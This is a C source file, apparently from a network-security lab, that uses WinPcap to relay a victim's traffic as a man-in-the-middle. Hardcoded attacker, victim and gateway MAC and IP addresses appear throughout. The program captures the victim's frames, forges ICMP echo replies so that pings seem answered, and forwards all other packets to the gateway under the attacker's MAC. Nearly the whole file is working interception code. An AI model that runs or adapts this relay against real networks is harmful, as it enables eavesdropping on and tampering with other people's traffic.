#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>

#include <winsock2.h>
#include <pcap.h>
#include <stdio.h>
#include <string.h>


#define MAC_ADDR_LEN 6
#define IP_ADDR_LEN 4
#define BUF_SIZE 100
#define SNAPLEN 65536

pcap_t *use_dev;

//이더넷 헤더
#pragma pack(push, 1)
struct ethernet_header {
    unsigned char eth_dst_mac[MAC_ADDR_LEN];
    unsigned char eth_src_mac[MAC_ADDR_LEN];
    unsigned short eth_type;
};
#pragma pack(pop)

//IP 헤더
#pragma pack(push, 1)
struct ip_header {
    unsigned char ip_version : 4; // ipv4
    unsigned char ip_header_len : 4; //Header Length
    unsigned char ip_tos;//Type of Service
    unsigned short ip_total_len;//Total Length
    unsigned short ip_id;
    unsigned short flags;
    unsigned char ip_TTL;
    unsigned char ip_protocol;
    unsigned short ip_checksum;
    unsigned char ip_src_addr[IP_ADDR_LEN];
    unsigned char ip_dst_addr[IP_ADDR_LEN];
    //20 bytes
};
#pragma pack(pop)
//icmp header
#pragma pack(push,1)
struct icmp_header {
    unsigned char type;
    unsigned char code;
    unsigned short checksum;
    unsigned long data;
};
#pragma pack(pop)

void ip_checksum(struct ip_header* _pIp);
void icmp_checksum(struct icmp_header* _pIp);
//main 시작
int main(int argc, char **argv) {
    //네트워크 장치 불러옴
    pcap_if_t *alldevs = NULL;
    pcap_if_t *dev;
    struct ethernet_header *eh;
    struct ip_header *ih;
    struct icmp_header *ch;
    

    //랩실
    unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
    unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x88,0x36,0x6c,0x7a,0x56,0x40 };
    unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,42,18 };
    unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0xb0,0x6e,0xbf,0xc6,0xfa,0x45 };
    unsigned char FAKE_IP[IP_ADDR_LEN] = { 192,168,42,16 };

    //우분투
    //unsigned char ATTACK_MAC[MAC_ADDR_LEN] = { 0x00,0xe0,0x4c,0x61,0xc8,0x1f };
    //unsigned char GATEWAY_MAC[MAC_ADDR_LEN] = { 0x00,0x01,0x36,0xf4,0x54,0x97 };
    //unsigned char ATTACK_IP[IP_ADDR_LEN] = { 192,168,25,15 };
    //unsigned char VICTIM_MAC[MAC_ADDR_LEN] = { 0x00,0x0c,0x29,0x18,0x38,0x4b };
    //unsigned char FAKE_IP[IP_ADDR_LEN] = { 192,168,42,16 };


    char errbuf[BUF_SIZE];
    char FILTER_RULE[BUF_SIZE] = "arp";
    //struct bpf_program rule_struct;
    int i, dev_num, res;
    struct pcap_pkthdr *header;
    const unsigned char *pkt_data;

    if (argv[1]) {
	strcpy(FILTER_RULE, "port ");
	strcat(FILTER_RULE, argv[1]);
    }

    if (pcap_findalldevs(&alldevs, errbuf) < 0) {
	printf("Device Find Error\n");
	return -1;
    }

    for (dev = alldevs, i = 0; dev != NULL; dev = dev->next) {
	printf("%d번 Device : %s (%s)\n", ++i, dev->name, dev->description);
    }
    printf("사용할 디바이스 번호 입력 : ");
    scanf("%d", &dev_num);

    for (dev = alldevs, i = 0; i < dev_num - 1; dev = dev->next, i++);

    if ((use_dev = pcap_open_live(dev->name, SNAPLEN, 1, 1000, errbuf)) == NULL) {
	printf("pcap_open ERROR!\n");
	pcap_freealldevs(alldevs);
	return -1;
    }
    printf("pcap_open 성공!\n");
    // pcap_open success!



    //Packet Capture
    while (1) {
	//형변환
	res = pcap_next_ex(use_dev, &header, &pkt_data);
	if (res <= 0) continue;
	unsigned char temp[5000] = { 0 };
	eh = (struct ethernet_header*)pkt_data;
	int Datapointer = sizeof(*eh);
	if (eh->eth_src_mac[0] == VICTIM_MAC[0]
	    && eh->eth_src_mac[1] == VICTIM_MAC[1]
	    && eh->eth_src_mac[2] == VICTIM_MAC[2]
	    && eh->eth_src_mac[3] == VICTIM_MAC[3]
	    && eh->eth_src_mac[4] == VICTIM_MAC[4]
	    && eh->eth_src_mac[5] == VICTIM_MAC[5])
	{
	    if (ntohs(eh->eth_type) == 0x0800) {
		ih = (struct ip_header*)(pkt_data + Datapointer);
		Datapointer += sizeof(*ih);
		if (ih->ip_dst_addr[0] != ATTACK_IP[0] ||
		    ih->ip_dst_addr[1] != ATTACK_IP[1] ||
		    ih->ip_dst_addr[2] != ATTACK_IP[2] ||
		    ih->ip_dst_addr[3] != ATTACK_IP[3]) 
		{
		    if (ih->ip_protocol ==0x01) {
			ch = (struct icmp_header*)(pkt_data + Datapointer);
			Datapointer += sizeof(*ch);
			if (ch->type== 0x08 && ch->code==0x00) {
			    //backwarding
			    //ethernet
			    memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
			    memcpy(eh->eth_dst_mac, VICTIM_MAC, sizeof(eh->eth_dst_mac));
			    int b_dp = sizeof(*eh);
			    memcpy(temp, eh, sizeof(*eh));
			    //ip
			    unsigned char temp_ip[IP_ADDR_LEN];
			    memcpy(temp_ip, ih->ip_dst_addr, sizeof(ih->ip_dst_addr));
			    memcpy(ih->ip_dst_addr, ih->ip_src_addr, sizeof(ih->ip_src_addr));
			    memcpy(ih->ip_src_addr, temp_ip, sizeof(temp_ip));
			    ih->ip_total_len = htons(sizeof(*ih) + sizeof(*ch));
			    ip_checksum(ih);
			    memcpy(temp + b_dp, ih, sizeof(*ih));
			    b_dp += sizeof(*ih);
			    printf("ip address changed \n");
			    //icmp
			    ch->type = 0x00;
			    ch->code = 0x00;
			    //icmp 체크섬
			    icmp_checksum(ch);
			    memcpy(temp + b_dp, ch, sizeof(*ch));
			    b_dp += sizeof(*ch);
			    printf("icmp changed\n");
			    //packet send
			    pcap_sendpacket(use_dev, temp, b_dp);
			    printf("packet sended!");
			}
			else {
			    //forwarding(icmp type&code)
			    memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
			    memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));


			    memcpy(temp, eh, sizeof(*eh));
			    memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

			    printf("forwarding\n");
			    pcap_sendpacket(use_dev, temp, header->caplen);
			}
		    }
		    else {
			//forwarding(ip_protocol)
			memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
			memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));


			memcpy(temp, eh, sizeof(*eh));
			memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

			printf("forwarding\n");
			pcap_sendpacket(use_dev, temp, header->caplen);
		    }
		}
		else {
		    //forwarding(ip)
		    memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
		    memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));


		    memcpy(temp, eh, sizeof(*eh));
		    memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

		    printf("forwarding\n");
		    pcap_sendpacket(use_dev, temp, header->caplen);
		}
	    }
	    else {
		//forwarding(eth type)
		memcpy(eh->eth_src_mac, ATTACK_MAC, sizeof(eh->eth_src_mac));
		memcpy(eh->eth_dst_mac, GATEWAY_MAC, sizeof(eh->eth_dst_mac));


		memcpy(temp, eh, sizeof(*eh));
		memcpy(temp + sizeof(*eh), pkt_data + sizeof(*eh), header->len - sizeof(*eh));

		printf("forwarding\n");
		pcap_sendpacket(use_dev, temp, header->caplen);
	    }
	}
    }
}

//checksum 계산
void ip_checksum(struct ip_header* _pIp)
{
    unsigned short * pIps = (unsigned short*)_pIp;
   //unsigned short len = (_pIp->ip_header_len) * 4, 
    u_short checksum;
    u_short len = sizeof(*_pIp);
    unsigned long check = 0;

    len >>= 1;
    _pIp->ip_checksum = 0;

    for (int i = 0; i < len; i++)
	check += *pIps++;

    check = (check >> 16) + (check & 0xffff);
    check += (check >> 16);

    checksum = (~check & 0xffff);

    _pIp->ip_checksum = checksum;
}

void icmp_checksum(struct icmp_header* _pIp)
{
    unsigned short * pIps = (unsigned short*)_pIp;
    //unsigned short len = (_pIp->ip_header_len) * 4, 
    u_short checksum;
    u_short len = sizeof(*_pIp);
    unsigned long check = 0;

    len >>= 1;
    _pIp->checksum = 0;

    for (int i = 0; i < len; i++)
	check += *pIps++;

    check = (check >> 16) + (check & 0xffff);
    check += (check >> 16);

    checksum = (~check & 0xffff);

    _pIp->checksum = checksum;
}
